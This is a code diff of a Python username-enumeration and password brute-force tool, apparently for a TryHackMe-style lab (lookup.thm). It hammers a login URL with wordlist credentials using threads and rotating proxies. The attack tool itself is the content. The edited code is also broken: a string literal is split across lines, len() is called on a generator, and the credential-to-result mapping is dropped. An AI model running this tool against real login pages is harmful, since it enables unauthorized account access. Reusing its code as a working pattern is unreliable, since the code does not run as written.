@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # This script was partially generated with the assistance of OpenAI's ChatGPT.
 
+
 import requests
 import time
 import random
@@ -12,7 +13,6 @@ from itertools import product
 # ==========================
 # Default Configuration
 # ==========================
-DEFAULT_URL = "http://lookup.thm/login.php"
 DEFAULT_USERNAME_FILE = "/usr/share/seclists/Usernames/Names/names.txt"
 DEFAULT_PASSWORD_FILE = "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 DEFAULT_OUTPUT_FILE = "valid_usernames.txt"
@@ -82,7 +82,7 @@ def check_password_combo(username: str, password: str, url: str, headers: dict, 
 
 def main():
     parser = argparse.ArgumentParser(description="Username checker with optional password testing.")
-    parser.add_argument("-u", "--url", type=str, default=DEFAULT_URL, help="Target login URL")
+    parser.add_argument("-u", "--url", type=str, required=True, help="Target login URL")
     parser.add_argument("-w", "--usernames", type=str, default=DEFAULT_USERNAME_FILE, help="Usernames file path")
     parser.add_argument("-n", "--passwords", type=str, default=DEFAULT_PASSWORD_FILE, help="Passwords file path")
     parser.add_argument("--output", type=str, default=DEFAULT_OUTPUT_FILE, help="Output file for valid usernames")
@@ -92,6 +92,11 @@ def main():
     parser.add_argument("--proxies", type=str, help="Path to proxy list file")
     parser.add_argument("--success-words", type=str, default=DEFAULT_SUCCESS_WORDS, help="Comma-separated success keywords")
     args = parser.parse_args()
+
+    if not args.url:
+        parser.error("
+[!] Missing required argument: --url.
+Example: python script.py -u http://target/login.php")
 
     headers = {
         'Host': 'enum.thm',
@@ -136,7 +141,7 @@ def main():
                 print_eta(start_time, idx, total)
                 last_status_time = now
 
-    print(f"\n\u2705 Username scan complete. Found {len(found)} valid usernames.")
+    print(f"\n✅ Username scan complete. Found {len(found)} valid usernames.")
     if found:
         print("\n\U0001f4cb Valid usernames:")
         for user in found:
@@ -148,7 +153,8 @@ def main():
     if args.check_passwords and found:
         print("\n\U0001f511 Starting password check...")
         passwords = load_lines(args.passwords)
-        combos = list(product(found, passwords))
+        # Use generator instead of full list to save memory
+        combos = product(found, passwords)
         total_combos = len(combos)
         print(f"\U0001f522 Total combinations to try: {total_combos}")
 
@@ -157,7 +163,8 @@ def main():
         successful_logins = []
 
         with ThreadPoolExecutor(max_workers=args.threads) as executor:
-            futures = {executor.submit(check_password_combo, u, p, args.url, headers, proxies, args.delay, success_keywords): (u, p) for u, p in combos}
+            # Submit tasks without storing all combinations in memory
+            futures = [executor.submit(check_password_combo, u, p, args.url, headers, proxies, args.delay, success_keywords) for u, p in combos]
 
             for idx, future in enumerate(as_completed(futures), start=1):
                 result = future.result()
